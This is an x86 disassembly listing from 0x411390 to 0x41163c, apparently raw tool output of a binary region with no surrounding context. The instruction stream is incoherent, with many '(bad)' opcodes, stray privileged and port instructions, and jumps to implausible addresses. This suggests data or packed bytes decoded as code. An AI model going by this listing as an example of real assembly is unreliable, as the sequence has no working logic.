  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
